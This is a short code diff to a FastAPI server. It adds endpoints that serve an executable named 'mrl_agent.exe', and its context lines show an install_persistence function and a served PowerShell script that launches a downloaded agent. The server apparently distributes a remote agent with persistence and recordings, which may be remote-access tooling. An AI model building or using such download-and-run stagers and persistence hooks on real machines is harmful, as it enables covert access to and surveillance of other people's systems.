@@ -10,8 +10,8 @@ from typing import List, Dict, Set
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response, Request
 from fastapi.staticfiles import StaticFiles
 import uvicorn
-from fastapi.responses import HTMLResponse, Response
-AGENT_VERSION = "9.3.11-ZERO"
+from fastapi.responses import HTMLResponse, Response, FileResponse
+AGENT_VERSION = "9.3.12-UCON"
 app = FastAPI()
 
 def install_persistence():
@@ -250,6 +250,11 @@ Write-Host "[BOOT] Launching agent..."
 Start-Process $dest
 """
     return Response(content=ps_script, media_type="text/plain")
+
+@app.get("/api/download")
+@app.get("/api/client_exe")
+async def download_agent():
+    return FileResponse("mrl_agent.exe", filename="mrl_agent.exe")
 
 app.mount("/recordings", StaticFiles(directory=RECORDINGS_DIR), name="recordings")
 app.mount("/", StaticFiles(directory=".", html=True), name="static")
